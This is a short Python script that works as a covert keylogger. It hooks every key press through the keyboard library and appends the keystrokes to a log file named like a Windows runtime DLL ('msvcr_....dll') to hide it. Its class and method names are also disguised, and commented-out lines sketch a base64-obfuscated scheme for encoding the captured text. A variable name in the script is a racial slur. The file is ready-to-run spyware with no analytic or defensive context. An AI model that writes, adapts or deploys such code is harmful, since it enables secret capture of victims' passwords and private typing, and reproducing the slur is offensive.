import keyboard
from datetime import datetime
import base64

class dll:

    def __init__(self):
        nigg = str(datetime.now())
        nigg = nigg.split(".")[-1]
        self.f = open(f"msvcr_{nigg}.dll","a+")
        self.dlls()

    def on_press(self,key):

        if key.name == "space":
            self.f.write(" ")
        elif key.name == "enter":
            self.f.write("\n")
        elif len(key.name) != 1:
            self.f.write(f"<{key.name}>")                    
        else:
            #chr(ord(key.name) + int(base64.b64decode(bytes('OQ==', 'utf-8')).decode()))
            self.f.write(key.name)
            #chr(ord(word[i]) - int(base64.b64decode(bytes('OQ==', 'utf-8')).decode()))

    def dlls(self):
        keyboard.on_press(self.on_press)
        keyboard.wait()
        self.f.close()

dl_ = dll()
